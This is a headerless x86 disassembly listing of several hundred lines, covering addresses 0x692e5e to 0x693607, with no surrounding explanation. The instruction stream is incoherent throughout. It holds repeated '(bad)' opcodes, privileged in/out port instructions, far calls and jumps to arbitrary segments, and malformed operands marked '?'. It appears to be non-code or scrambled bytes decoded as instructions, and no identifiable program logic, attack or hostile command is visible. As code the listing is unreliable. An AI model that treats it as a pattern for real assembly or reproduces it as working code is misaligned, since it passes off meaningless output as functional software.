  692e5e:	out    0xfd,al
  692e60:	fcmovne st,st(4)
  692e62:	pop    ebp
  692e63:	mov    al,ds:0x380236b0
  692e68:	pop    ss
  692e69:	adc    al,0xaa
  692e6b:	sar    edx,1
  692e6d:	scas   eax,DWORD PTR es:[edi]
  692e6e:	mov    cl,0x36
  692e70:	mov    ecx,0xae979367
  692e75:	lahf   
  692e76:	and    BYTE PTR [ecx-0x27],dh
  692e79:	xchg   ecx,eax
  692e7a:	and    al,0x48
  692e7c:	or     ch,dl
  692e7e:	push   es
  692e7f:	out    dx,al
  692e80:	in     eax,0x6b
  692e82:	fcomp  DWORD PTR [esi+0x6acbbf66]
  692e88:	bound  esi,QWORD PTR [ecx]
  692e8a:	lea    edx,[esi-0x524da7aa]
  692e90:	leave  
  692e91:	scas   al,BYTE PTR es:[edi]
  692e92:	mov    bh,0x83
  692e94:	das    
  692e95:	cs shl bh,0x78
  692e99:	call   0x138431b1
  692e9e:	mov    WORD PTR [ecx+0x13],gs
  692ea1:	cmp    cl,dh
  692ea3:	and    al,0xd
  692ea5:	xchg   esp,eax
  692ea6:	adc    BYTE PTR [edi+0x71],0x57
  692eaa:	add    cl,BYTE PTR [edx-0x21bd3453]
  692eb0:	sub    ecx,DWORD PTR [eax+ebp*4-0x60]
  692eb4:	scas   al,BYTE PTR es:[edi]
  692eb5:	jno    0x692f31
  692eb7:	retf   0x800
  692eba:	mov    bl,0x7b
  692ebc:	sbb    eax,0xc93403b9
  692ec1:	and    DWORD PTR [ebx-0x4e],ebp
  692ec4:	xchg   edx,ebx
  692ec6:	sahf   
  692ec7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  692ec8:	jo     0x692e5b
  692eca:	aad    0x5b
  692ecc:	dec    DWORD PTR [edx+eiz*4+0x1f]
  692ed0:	push   esi
  692ed1:	hlt    
  692ed2:	outs   dx,DWORD PTR ds:[esi]
  692ed3:	pop    ds
  692ed4:	fidivr DWORD PTR [ecx+ebx*1]
  692ed7:	push   ds
  692ed8:	ins    BYTE PTR es:[edi],dx
  692ed9:	repz sub BYTE PTR [esi],cl
  692edc:	popa   
  692edd:	adc    DWORD PTR [ecx-0x9f2ce30],edx
  692ee3:	pop    ecx
  692ee4:	nop
  692ee5:	fwait
  692ee6:	dec    edx
  692ee7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  692ee8:	inc    ecx
  692ee9:	mov    BYTE PTR [edi],bl
  692eeb:	xchg   edi,eax
  692eec:	mul    DWORD PTR [edi-0x2d]
  692eef:	mov    bh,0xb7
  692ef1:	fcomp  st(5)
  692ef3:	inc    edx
  692ef4:	bound  ebx,QWORD PTR [edx]
  692ef6:	and    ebx,esp
  692ef8:	dec    eax
  692ef9:	pop    edi
  692efa:	mov    DWORD PTR [eax+0x774697af],edx
  692f00:	mov    eax,0x5dd029c8
  692f05:	std    
  692f06:	(bad)  
  692f07:	mov    al,ds:0x1fc609c9
  692f0c:	dec    edi
  692f0d:	pop    ebx
  692f0e:	pusha  
  692f0f:	xchg   ebp,eax
  692f10:	cmp    eax,edx
  692f12:	cmc    
  692f13:	jmp    0x4ac16c33
  692f18:	fdiv   DWORD PTR [ebx-0x58]
  692f1b:	lds    ecx,FWORD PTR [ebx+0x2a]
  692f1e:	scas   eax,DWORD PTR es:[edi]
  692f1f:	mov    cl,0x88
  692f21:	mov    bh,0x4a
  692f23:	out    dx,al
  692f24:	dec    esi
  692f25:	dec    ecx
  692f26:	shl    BYTE PTR [ecx+ebx*1-0x32ca3259],0xbf
  692f2e:	pop    edx
  692f2f:	jnp    0x692efe
  692f31:	push   edx
  692f32:	mov    ds:0x20919a89,eax
  692f37:	fiadd  DWORD PTR [ebx+0x2e]
  692f3a:	or     DWORD PTR [ecx],0xfffffff9
  692f3d:	jle    0x692ec3
  692f3f:	stc    
  692f40:	sub    cl,BYTE PTR [edx+0x78]
  692f43:	test   DWORD PTR [ecx],edi
  692f45:	mov    bh,0x93
  692f47:	and    al,BYTE PTR [si-0x6126]
  692f4c:	xchg   ebp,eax
  692f4d:	out    0xa0,eax
  692f4f:	mov    ?,WORD PTR [esi]
  692f51:	sbb    BYTE PTR [ebp+edi*1+0x1bc541ac],al
  692f58:	test   BYTE PTR [edx-0x2205d986],bl
  692f5e:	cmp    eax,DWORD PTR [edi+0x2b]
  692f61:	push   edx
  692f62:	pop    esp
  692f63:	adc    eax,0x22e9903f
  692f68:	xchg   ebp,eax
  692f6a:	dec    ebx
  692f6b:	mov    ebx,0xf615efa
  692f70:	push   ebx
  692f71:	sub    BYTE PTR [ebx+0x6],ah
  692f74:	rol    DWORD PTR [ebp-0x65],1
  692f77:	push   edi
  692f78:	call   0xf52c:0x94d79268
  692f7f:	jbe    0x692fd7
  692f81:	jmp    0x692fee
  692f83:	out    0xcc,eax
  692f85:	test   DWORD PTR [eax-0x4c],ebx
  692f88:	pop    edi
  692f89:	(bad)  
  692f8a:	xchg   edi,eax
  692f8b:	xor    eax,0x88947561
  692f90:	cmp    ah,BYTE PTR [edi-0x59]
  692f93:	push   edx
  692f94:	pop    ss
  692f95:	ror    DWORD PTR [edi-0x36],0xd2
  692f99:	arpl   WORD PTR [ebp-0x3c],cx
  692f9c:	pop    es
  692f9d:	sahf   
  692f9e:	into   
  692f9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  692fa0:	cmp    eax,0x9d94586
  692fa5:	inc    edx
  692fa6:	add    edx,ecx
  692fa8:	lock inc esp
  692faa:	(bad)  
  692fab:	dec    BYTE PTR [esi+0x2433e0dd]
  692fb1:	dec    ebx
  692fb2:	jae    0x692ff3
  692fb4:	loope  0x692f5b
  692fb6:	stc    
  692fb7:	and    BYTE PTR [ecx-0x3b],0x69
  692fbb:	ins    DWORD PTR es:[edi],dx
  692fbc:	shl    BYTE PTR [edi],0xdc
  692fbf:	cmovae esi,DWORD PTR [edi]
  692fc2:	jno    0x692f60
  692fc4:	pushf  
  692fc5:	jns    0x692fed
  692fc7:	dec    ecx
  692fc8:	inc    esi
  692fc9:	jge    0x692fa2
  692fcb:	(bad)  
  692fcc:	clc    
  692fcd:	std    
  692fce:	lods   eax,DWORD PTR ds:[esi]
  692fcf:	int3   
  692fd0:	dec    di
  692fd2:	(bad)  
  692fd4:	mov    ah,0x40
  692fd6:	fisub  WORD PTR [esi-0x6]
  692fd9:	mov    dh,ch
  692fdb:	dec    edi
  692fdc:	out    dx,eax
  692fdd:	test   DWORD PTR [ecx],edx
  692fdf:	lahf   
  692fe0:	jg     0x692fd2
  692fe2:	fnsave [ebp-0x2ce08e38]
  692fe8:	xchg   ebx,eax
  692fe9:	aam    0xeb
  692feb:	call   0xed5ea633
  692ff0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  692ff1:	pop    ebx
  692ff2:	shl    DWORD PTR [edx+ecx*8+0xda980ef],1
  692ff9:	(bad)  
  692ffa:	(bad)  
  692ffb:	or     ebx,DWORD PTR [edx+0x14]
  692ffe:	mov    esp,0xf19391f9
  693003:	in     al,0xc9
  693005:	imul   esi,DWORD PTR [esi-0xd7abc],0x9779defc
  69300f:	sbb    eax,0x5753d004
  693014:	out    0x91,al
  693016:	ficomp WORD PTR [ecx]
  693018:	jmp    0x6107:0xfc39939e
  69301f:	or     DWORD PTR [esi],edx
  693021:	dec    edi
  693022:	iret   
  693023:	mov    ah,BYTE PTR [esi+edx*2+0x7b]
  693027:	loop   0x69303c
  693029:	hlt    
  69302a:	fdivr  st(1),st
  69302c:	or     DWORD PTR [ebp+0x69],ebx
  69302f:	add    ecx,ebx
  693031:	loope  0x69301e
  693033:	test   al,0xf6
  693035:	lds    edx,FWORD PTR [ecx+0x9300f69]
  69303b:	popa   
  69303c:	xchg   esi,eax
  69303d:	xchg   DWORD PTR [ebx+0x1b78f3b2],ebx
  693043:	add    ebp,esp
  693045:	sbb    edx,edi
  693047:	(bad)  
  693048:	out    dx,al
  693049:	and    al,0x56
  69304b:	sti    
  69304c:	mov    WORD PTR [edx],ds
  69304e:	and    DWORD PTR [ebp+0x40],ebx
  693051:	das    
  693052:	mov    ecx,0x8682e48e
  693057:	shl    DWORD PTR [ebp+esi*8+0x1a7a73ca],1
  69305e:	stos   DWORD PTR es:[edi],eax
  69305f:	push   esi
  693060:	repz ret 0xb086
  693064:	add    BYTE PTR [eax],al
  693066:	mov    dl,0x62
  693068:	retf   0xa4db
  69306b:	iret   
  69306c:	jb     0x6930bc
  69306e:	sar    DWORD PTR [ecx+0x23],0x9c
  693072:	sub    bl,dl
  693074:	lea    ebp,[edi-0x77d1fc8b]
  69307a:	or     DWORD PTR [edi+0x7aa348b0],0x8ad187f7
  693084:	mov    dl,0x13
  693086:	addr16 data16 sahf 
  693089:	js     0x69308a
  69308b:	mov    ecx,0xf5a6ec9d
  693090:	push   eax
  693091:	aam    0xad
  693093:	dec    ecx
  693094:	mov    cl,0x5c
  693096:	adc    cl,al
  693098:	call   0x44db1c2c
  69309d:	cdq    
  69309e:	or     DWORD PTR [edi-0x3f25fcae],esi
  6930a4:	out    dx,ax
  6930a6:	mov    edi,DWORD PTR ds:0x282be348
  6930ac:	xchg   BYTE PTR [edi],bl
  6930ae:	rcl    DWORD PTR [edi],cl
  6930b0:	mov    ebx,DWORD PTR [edi+0x6a04dd80]
  6930b6:	sbb    dl,BYTE PTR [ebx]
  6930b8:	in     al,dx
  6930b9:	and    eax,0x68c2394c
  6930be:	out    0x3b,eax
  6930c0:	test   BYTE PTR [ecx-0x38],ah
  6930c3:	clc    
  6930c4:	pop    es
  6930c5:	scas   eax,DWORD PTR es:[edi]
  6930c6:	test   BYTE PTR [ebx-0x7690954a],dh
  6930cc:	pop    esp
  6930cd:	mov    ebp,0x1fafbe7
  6930d2:	jo     0x69313a
  6930d4:	cwde   
  6930d5:	dec    esi
  6930d6:	add    bh,bl
  6930d8:	aam    0x94
  6930da:	dec    edi
  6930db:	lds    edi,FWORD PTR [edi+eiz*4+0x76273f1e]
  6930e2:	fiadd  WORD PTR [eax]
  6930e4:	push   esp
  6930e5:	call   0x34b21087
  6930ea:	dec    esp
  6930eb:	or     bh,al
  6930ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6930ee:	dec    esp
  6930ef:	fist   DWORD PTR [esi+0x408e520e]
  6930f5:	repnz push 0xffffffd1
  6930f8:	sub    BYTE PTR [ebx+eax*8],0x79
  6930fc:	shr    DWORD PTR [esi],0xcf
  6930ff:	jp     0x6930e5
  693101:	jl     0x6930e6
  693103:	lock add dl,ch
  693106:	popf   
  693107:	das    
  693108:	or     DWORD PTR [edx+ebp*2-0x62],ebx
  69310c:	shl    DWORD PTR [eax-0x2bab06c2],cl
  693112:	dec    eax
  693113:	mov    es,WORD PTR [edi]
  693115:	and    dl,BYTE PTR ds:0x8811d33c
  69311b:	shl    BYTE PTR [ebx+0x4556d28f],1
  693121:	cmp    cl,BYTE PTR [edx-0x7d]
  693124:	or     al,0x5
  693126:	jne    0x6930f5
  693128:	or     esp,esi
  69312a:	adc    dl,al
  69312c:	loope  0x693186
  69312e:	out    0xb3,al
  693130:	sub    ah,BYTE PTR [edi-0x499ec24d]
  693136:	pop    ecx
  693137:	nop
  693138:	ror    DWORD PTR [ebx-0xc],0xf6
  69313c:	pop    es
  69313d:	and    esp,DWORD PTR [esi]
  69313f:	cmp    DWORD PTR [edi+edx*2+0x12],ebp
  693143:	mov    ds:0xcb55194c,eax
  693148:	into   
  693149:	retf   0x47ee
  69314c:	rcl    DWORD PTR [edi-0x23fa626b],0xa3
  693153:	call   0x3d8a8848
  693158:	pop    ss
  693159:	int    0xaa
  69315b:	push   eax
  69315c:	data16 mov al,0x34
  69315f:	pusha  
  693160:	fwait
  693161:	sub    ah,BYTE PTR [edi]
  693163:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  693166:	lods   eax,DWORD PTR ds:[esi]
  693167:	cmp    BYTE PTR [ecx-0x24],al
  69316a:	les    eax,FWORD PTR [ecx]
  69316c:	aam    0x81
  69316e:	ffree  st(7)
  693170:	out    0x5e,al
  693172:	test   eax,0x29bd618b
  693177:	in     al,0x57
  693179:	sbb    BYTE PTR [edi-0x38c26a70],al
  69317f:	adc    al,0xa4
  693181:	dec    esp
  693182:	mov    bl,0xd7
  693184:	push   ebp
  693185:	push   ebp
  693186:	add    esp,DWORD PTR [ebx]
  693188:	mov    ch,0x1b
  69318a:	test   eax,0xbb11cbd7
  69318f:	mov    al,0xaa
  693191:	mov    al,ds:0xe432091f
  693196:	xor    ah,BYTE PTR [eax-0xdc80488]
  69319c:	out    dx,al
  69319d:	test   DWORD PTR [eax+eax*2+0x28],ebp
  6931a1:	scas   al,BYTE PTR es:[edi]
  6931a2:	popa   
  6931a3:	test   eax,0xaac1b57c
  6931a8:	mov    ecx,DWORD PTR [esi-0x56]
  6931ab:	and    al,0x1d
  6931ad:	and    DWORD PTR [ecx+0x34351542],esi
  6931b3:	dec    edi
  6931b4:	pop    ecx
  6931b5:	jb     0x693181
  6931b7:	adc    eax,0x30f94962
  6931bc:	xchg   ebp,eax
  6931bd:	inc    eax
  6931be:	cmp    BYTE PTR [ebp-0x78],0xd6
  6931c2:	mov    edi,0x5a8f949
  6931c7:	daa    
  6931c8:	not    ah
  6931ca:	inc    esi
  6931cb:	jl     0x69315d
  6931cd:	ins    BYTE PTR es:[edi],dx
  6931ce:	adc    dh,dh
  6931d0:	adc    esi,DWORD PTR [esi-0x8a57751]
  6931d6:	and    eax,0x30da26de
  6931db:	add    DWORD PTR [ecx+0x64553638],edx
  6931e1:	pop    ecx
  6931e2:	adc    BYTE PTR [ecx],bl
  6931e4:	add    ebx,ebp
  6931e6:	add    eax,eax
  6931e8:	sub    bh,BYTE PTR [eax+edi*2-0x336a93e8]
  6931ef:	test   al,0x8d
  6931f1:	pusha  
  6931f2:	cmp    al,0x91
  6931f4:	cmp    al,0xca
  6931f6:	pop    ecx
  6931f7:	out    0x3d,al
  6931f9:	jle    0x6931a9
  6931fb:	aad    0xac
  6931fd:	sub    eax,0x397064ec
  693202:	adc    bh,BYTE PTR [esi+esi*2+0x53bed76b]
  693209:	fmulp  st(4),st
  69320b:	jns    0x6931f7
  69320d:	xchg   DWORD PTR [ecx+0x62],ebp
  693210:	out    dx,al
  693211:	mov    ch,0xd4
  693213:	xlat   BYTE PTR ds:[ebx]
  693214:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  693215:	scas   al,BYTE PTR es:[edi]
  693216:	inc    edx
  693217:	pop    esp
  693218:	sbb    al,0x3f
  69321a:	rcr    BYTE PTR [edx+0x53314a31],0x60
  693221:	sub    DWORD PTR [edx-0x22bcacd6],esp
  693227:	sub    BYTE PTR [ecx+0x7c],bl
  69322a:	sbb    DWORD PTR [ecx],edi
  69322c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  69322d:	push   ss
  69322e:	fcomp  QWORD PTR [ebp+0x2261f023]
  693234:	xchg   ebx,eax
  693235:	push   ebp
  693236:	(bad)  
  693237:	jmp    0x693289
  693239:	mov    dl,0x64
  69323b:	mov    esp,0x6db60fc6
  693240:	adc    dl,BYTE PTR [ecx+0x5cb85447]
  693246:	xor    eax,0x1921a578
  69324b:	cmp    eax,0x422dbeb8
  693250:	je     0x6932a3
  693252:	hlt    
  693253:	sub    dh,bh
  693255:	mov    al,0x88
  693257:	mov    ds:0xb49495d1,al
  69325c:	mov    ebx,0x72ecef58
  693261:	inc    ebx
  693262:	loop   0x693233
  693264:	and    BYTE PTR ds:0xb7a0d060,bl
  69326a:	inc    ecx
  69326b:	arpl   WORD PTR [edx-0x71],ax
  69326e:	mov    al,ds:0x86add617
  693273:	ja     0x69324c
  693275:	test   al,0x24
  693277:	shl    BYTE PTR [edi+0x3a4183b7],0x73
  69327e:	(bad)  
  69327f:	dec    ecx
  693280:	and    ch,ch
  693282:	loope  0x693243
  693284:	and    BYTE PTR [edi+eax*4-0x58],cl
  693288:	inc    edi
  693289:	mov    ebp,es
  69328b:	jae    0x6932eb
  69328d:	mov    eax,0xd28c98b2
  693292:	mov    DWORD PTR [ecx-0x30],ebx
  693295:	call   0x35e52ba6
  69329a:	aas    
  69329b:	jnp    0x69322b
  69329d:	dec    ecx
  69329e:	inc    eax
  69329f:	mov    ah,0xe8
  6932a1:	or     BYTE PTR [edx+ebx*8+0x5b],bh
  6932a5:	push   eax
  6932a6:	mov    al,0x21
  6932a8:	aam    0xd5
  6932aa:	jg     0x6932bb
  6932ac:	fisttp DWORD PTR [ecx]
  6932ae:	mov    al,ds:0x34505c0d
  6932b3:	aas    
  6932b4:	stos   DWORD PTR es:[edi],eax
  6932b5:	jl     0x69331e
  6932b7:	sti    
  6932b8:	pop    esp
  6932b9:	inc    ebx
  6932ba:	in     eax,0xd6
  6932bc:	out    dx,al
  6932bd:	(bad)  
  6932bf:	shl    dh,1
  6932c1:	lods   eax,DWORD PTR ds:[esi]
  6932c2:	hlt    
  6932c3:	fwait
  6932c4:	jmp    0x814a3252
  6932c9:	dec    ecx
  6932ca:	lods   al,BYTE PTR ds:[esi]
  6932cb:	fsub   DWORD PTR [ebp+0x6c]
  6932ce:	sbb    DWORD PTR [ebx],esi
  6932d0:	mov    ebx,0x808ea0c2
  6932d5:	inc    ebp
  6932d6:	xor    ecx,DWORD PTR [edx]
  6932d8:	out    dx,al
  6932d9:	add    edi,DWORD PTR [eax-0x74]
  6932dc:	rcr    DWORD PTR [edx-0x3f],1
  6932df:	ret    
  6932e0:	jnp    0x6932b9
  6932e2:	add    al,0xf5
  6932e4:	pop    ds
  6932e5:	call   0x9d039d16
  6932ea:	push   ss
  6932eb:	scas   eax,DWORD PTR es:[edi]
  6932ec:	popf   
  6932ed:	push   ebp
  6932ee:	fwait
  6932ef:	jb     0x69331b
  6932f1:	mov    eax,0x35592011
  6932f6:	fsub   DWORD PTR [ebx+0x70f98e57]
  6932fc:	cs nop
  6932fe:	sbb    ah,BYTE PTR [esi]
  693300:	adc    DWORD PTR [ecx],esp
  693302:	iret   
  693303:	xchg   ebp,eax
  693304:	jmp    DWORD PTR [edi]
  693306:	adc    DWORD PTR [ebp+0x65bddf29],esp
  69330c:	inc    dh
  69330e:	adc    BYTE PTR [esi],ah
  693310:	push   edi
  693311:	repnz pop edi
  693313:	xchg   esp,eax
  693314:	adc    al,BYTE PTR es:[ebx]
  693317:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  693318:	mov    eax,ds:0x2ab8bebc
  69331d:	adc    eax,0xc8e74c24
  693322:	popf   
  693323:	fsubr  QWORD PTR [esi]
  693325:	sbb    ch,BYTE PTR [edi+0x593c3fa4]
  69332b:	jmp    0xb452156f
  693330:	push   ecx
  693331:	mov    al,0x47
  693333:	push   esp
  693334:	stos   BYTE PTR es:[edi],al
  693335:	mov    WORD PTR [ecx-0x1b],fs
  693338:	sar    bl,cl
  69333a:	mov    BYTE PTR [edi-0x26],cl
  69333d:	leave  
  69333e:	popa   
  69333f:	cmp    eax,0x750f752a
  693344:	push   ebx
  693345:	jbe    0x6932cb
  693347:	and    al,0xdf
  693349:	int    0x32
  69334b:	push   ebx
  69334c:	outs   dx,BYTE PTR ds:[esi]
  69334d:	dec    esi
  69334e:	pop    ss
  69334f:	(bad)  
  693350:	mov    esp,0x5551cd3a
  693355:	push   ds
  693356:	mov    DWORD PTR [eax],eax
  693358:	fisttp QWORD PTR [eax-0x2c491407]
  69335e:	adc    eax,0x313fa404
  693363:	js     0x6933d0
  693365:	or     BYTE PTR [ecx],ah
  693367:	inc    ebx
  693368:	repz inc ebp
  69336a:	mov    WORD PTR [esi+edx*1-0x58],ss
  69336e:	jge    0x6933c3
  693370:	adc    esp,DWORD PTR [eax+0xd566ad]
  693376:	and    al,0xb3
  693378:	jg     0x693397
  69337a:	lods   eax,DWORD PTR ds:[esi]
  69337b:	mov    ecx,?
  69337d:	add    DWORD PTR [edi+0x6a8fab92],eax
  693383:	jnp    0x6933ad
  693385:	(bad)  
  693386:	push   edx
  693387:	push   ds
  693388:	push   ecx
  693389:	inc    esp
  69338a:	and    al,BYTE PTR [edi-0x72]
  69338d:	push   ebx
  69338e:	aas    
  69338f:	push   ss
  693390:	shl    BYTE PTR [edx+ecx*4-0x64],1
  693394:	(bad)  
  693395:	aad    0xf
  693397:	fcmovnb st,st(0)
  693399:	gs in  eax,0x4a
  69339c:	ret    0x77b7
  69339f:	or     BYTE PTR [edx],0x33
  6933a2:	inc    esp
  6933a3:	push   ss
  6933a4:	(bad)  
  6933a5:	sahf   
  6933a6:	jmp    0x15496cae
  6933ab:	dec    edi
  6933ac:	sbb    ebp,edx
  6933ae:	and    eax,0x740396c3
  6933b3:	push   esi
  6933b4:	js     0x693415
  6933b6:	pop    edx
  6933b7:	call   0x5d23e71f
  6933bc:	fmulp  st(0),st
  6933be:	fnstcw WORD PTR [esi-0x13]
  6933c1:	jge    0x693360
  6933c3:	push   esi
  6933c4:	test   al,0x3c
  6933c6:	jecxz  0x69335d
  6933c8:	aam    0xca
  6933ca:	and    eax,DWORD PTR [ebp-0x44]
  6933cd:	dec    eax
  6933ce:	shr    ch,0x8d
  6933d1:	cdq    
  6933d2:	adc    al,0xa8
  6933d4:	mul    BYTE PTR [eax]
  6933d6:	or     dh,BYTE PTR [esi+ecx*2]
  6933d9:	mov    esp,0x8742a3cf
  6933de:	xchg   esi,eax
  6933df:	mov    eax,0x6df2e80e
  6933e4:	sbb    eax,0xdfdbd6a6
  6933e9:	jg     0x69346a
  6933eb:	fisttp WORD PTR [esi-0x70]
  6933ee:	and    DWORD PTR [esi-0x5c427bd1],eax
  6933f4:	scas   al,BYTE PTR es:[edi]
  6933f5:	sub    eax,eax
  6933f7:	pop    ss
  6933f8:	dec    ebp
  6933f9:	fs stc 
  6933fb:	sahf   
  6933fc:	push   edi
  6933fd:	jg     0x69341f
  6933ff:	jg     0x693460
  693401:	gs (bad) 
  693403:	pop    ecx
  693404:	xchg   ebp,eax
  693405:	xor    al,0x5e
  693407:	and    DWORD PTR [ebx-0x2a],ecx
  69340a:	adc    ch,BYTE PTR [edi-0x68ec917b]
  693410:	pop    ss
  693411:	inc    ebp
  693412:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  693413:	ret    
  693414:	rol    DWORD PTR [ecx-0x23051ad2],1
  69341a:	cwde   
  69341b:	and    al,0xa9
  69341d:	jb     0x69342c
  69341f:	xchg   esp,eax
  693420:	mov    edx,0xe8919c31
  693425:	xchg   esi,eax
  693427:	fstp   st(5)
  693429:	in     al,dx
  69342a:	rol    DWORD PTR [ecx-0x60],cl
  69342d:	push   ecx
  69342e:	add    al,0x38
  693430:	bound  edi,QWORD PTR [edx]
  693432:	sbb    ah,dl
  693434:	cdq    
  693435:	pop    ds
  693436:	aad    0xbc
  693438:	dec    edx
  693439:	repz add bl,bl
  69343c:	js     0x6933db
  69343e:	(bad)
  693442:	mov    ch,0x44
  693444:	sbb    eax,0xdf7bf6d9
  693449:	or     eax,0xbb032136
  69344e:	jmp    0x6933dc
  693450:	sahf   
  693451:	repnz add edi,DWORD PTR [edi+eiz*1-0x6d3d2118]
  693459:	pop    esi
  69345a:	(bad)  
  69345b:	mov    bl,0xce
  69345d:	pmaxub mm1,QWORD PTR [eax+eax*4-0x46fa0582]
  693465:	(bad)  
  693466:	dec    edx
  693467:	push   ds
  693468:	jae    0x6934de
  69346a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  69346b:	ins    DWORD PTR es:[edi],dx
  69346c:	and    BYTE PTR [eax+0x4ca6140d],bl
  693472:	dec    edi
  693473:	adc    eax,0x22222474
  693478:	dec    ebx
  693479:	jle    0x693418
  69347b:	leave  
  69347c:	imul   esi,DWORD PTR [esi],0xc2f2d5dd
  693482:	sbb    cl,dh
  693484:	into   
  693485:	cmc    
  693486:	inc    ebx
  693487:	adc    eax,0xbe136f7b
  69348c:	add    DWORD PTR [edi-0x4b],ebx
  69348f:	pushf  
  693490:	xchg   ebx,eax
  693491:	fmul   QWORD PTR [ebx+0x3dfd1efc]
  693497:	xchg   ebx,eax
  693498:	adc    BYTE PTR [ebx+0x328137fe],al
  69349e:	and    ecx,0xffffff9b
  6934a1:	call   0xda67a85c
  6934a6:	xchg   edx,eax
  6934a7:	ja     0x6934ea
  6934a9:	xor    DWORD PTR [edx],esi
  6934ab:	clc    
  6934ac:	jae    0x6934ec
  6934ae:	pop    edx
  6934af:	int3   
  6934b0:	or     al,0x89
  6934b2:	add    ch,bl
  6934b4:	sub    BYTE PTR [ebp+0x3e7ef043],0xa4
  6934bb:	test   BYTE PTR [eax],cl
  6934bd:	push   es
  6934be:	inc    edi
  6934bf:	mov    ds:0xa6ca9642,eax
  6934c4:	outs   dx,DWORD PTR ds:[esi]
  6934c5:	jae    0x693484
  6934c7:	pop    eax
  6934c8:	add    dl,ch
  6934ca:	mov    bh,BYTE PTR [ecx]
  6934cc:	js     0x69352b
  6934ce:	(bad)  [ecx]
  6934d0:	mov    ah,0x87
  6934d2:	mov    dh,0xe
  6934d4:	repz mov esi,0xa9e70103
  6934da:	fsub   QWORD PTR [edi+0x68]
  6934dd:	out    dx,al
  6934de:	out    dx,al
  6934df:	in     eax,0x5
  6934e1:	fld    DWORD PTR [ecx]
  6934e3:	adc    al,0x42
  6934e5:	ror    BYTE PTR [edi-0x5d235ba0],1
  6934eb:	adc    ch,BYTE PTR [eax+0x7e24cb52]
  6934f1:	dec    ebx
  6934f2:	jb     0x6934a3
  6934f4:	sbb    bl,BYTE PTR [esi]
  6934f6:	jmp    0x762e:0x6849b3a0
  6934fd:	add    ecx,DWORD PTR [esi]
  6934ff:	jecxz  0x6934b9
  693501:	push   eax
  693502:	es ins BYTE PTR es:[edi],dx
  693504:	inc    esi
  693505:	outs   dx,DWORD PTR ds:[esi]
  693506:	test   eax,0x2a0488c0
  69350b:	jns    0x69351c
  69350d:	daa    
  69350e:	ret    0xb41e
  693511:	sbb    al,0x5c
  693513:	fwait
  693514:	or     cl,BYTE PTR [esi]
  693516:	inc    ecx
  693517:	popf   
  693518:	jno    0x6934b9
  69351a:	je     0x6934b2
  69351c:	lods   eax,DWORD PTR ds:[esi]
  69351d:	icebp  
  69351e:	add    cl,BYTE PTR [ebx+edx*2]
  693521:	(bad)  
  693522:	scas   eax,DWORD PTR es:[edi]
  693523:	mov    ds:0x9f098e45,eax
  693528:	fwait
  693529:	scas   al,BYTE PTR es:[edi]
  69352a:	scas   eax,DWORD PTR es:[edi]
  69352b:	add    BYTE PTR [ebp+0x34],bh
  69352e:	outs   dx,DWORD PTR ds:[esi]
  69352f:	cli    
  693530:	and    BYTE PTR [edi-0x51],dh
  693533:	cdq    
  693534:	pop    esi
  693535:	adc    BYTE PTR [ecx+0xf395650],al
  69353b:	mov    dh,0x9d
  69353d:	cmc    
  69353e:	mov    WORD PTR [eax-0x460f8a26],ds
  693544:	or     al,0x55
  693546:	xchg   ebp,eax
  693547:	xor    BYTE PTR [eax+eiz*8+0x5bf168c6],bh
  69354e:	das    
  69354f:	sub    eax,0xe8a6130e
  693554:	rcr    BYTE PTR [ebx+0x51670efc],1
  69355a:	mov    dh,0x7f
  69355c:	and    al,cl
  69355e:	fxch   st(3)
  693560:	jnp    0x6934f5
  693562:	push   ss
  693563:	lods   eax,DWORD PTR ds:[esi]
  693564:	fild   WORD PTR [eax]
  693566:	std    
  693567:	jns    0x6935db
  693569:	and    edi,edi
  69356b:	cmp    edi,ecx
  69356d:	ret    
  69356e:	ins    BYTE PTR es:[edi],dx
  69356f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  693570:	ins    BYTE PTR es:[edi],dx
  693571:	repnz mov dl,0x5e
  693574:	aas    
  693575:	hlt    
  693576:	push   ebx
  693577:	ss int3 
  693579:	fsub   st,st(4)
  69357b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  69357c:	adc    eax,0x1dc51bf6
  693581:	mov    bh,0x1f
  693583:	jno    0x693587
  693585:	or     al,0x64
  693587:	or     DWORD PTR [edx],0x42
  69358a:	test   al,0x56
  69358c:	push   0xd19d3688
  693591:	nop
  693592:	call   0xa82a:0x47b0
  693598:	sub    al,0x7a
  69359a:	test   esp,esi
  69359c:	out    0xa2,eax
  69359e:	gs push edx
  6935a0:	mov    BYTE PTR [edi],cl
  6935a2:	lods   al,BYTE PTR ds:[esi]
  6935a3:	push   DWORD PTR [eax+esi*4-0x1d]
  6935a7:	mov    dl,0x6c
  6935a9:	adc    eax,0x4049327d
  6935ae:	shl    DWORD PTR [ebx+0x28],1
  6935b1:	add    al,0x75
  6935b3:	hlt    
  6935b4:	in     al,dx
  6935b5:	das    
  6935b6:	jb     0x693583
  6935b8:	test   al,0xc5
  6935ba:	aam    0xae
  6935bc:	mov    ecx,0x782651e6
  6935c1:	test   eax,0x300dce3a
  6935c6:	mov    ebx,0xdaabeb2f
  6935cb:	mov    WORD PTR [edx],ds
  6935cd:	mov    bl,0x88
  6935cf:	jae    0x693562
  6935d1:	add    ah,bl
  6935d3:	nop
  6935d4:	sbb    eax,0x21091fff
  6935d9:	and    dh,BYTE PTR [edx+0x2b]
  6935dc:	mov    esp,0x3fd44dbe
  6935e1:	xor    al,0x96
  6935e3:	jns    0x6935cf
  6935e5:	std    
  6935e6:	call   0x53d8:0xa2f1823d
  6935ed:	jmp    DWORD PTR [esi]
  6935ef:	jno    0x69365c
  6935f1:	idiv   DWORD PTR [ecx]
  6935f3:	nop
  6935f4:	xor    DWORD PTR [edi+0x757a343d],ebx
  6935fa:	or     DWORD PTR [edi+0x2cb0b273],edi
  693600:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  693601:	neg    DWORD PTR [esi-0x6c19e59a]
  693607:	jl     0x6935aa
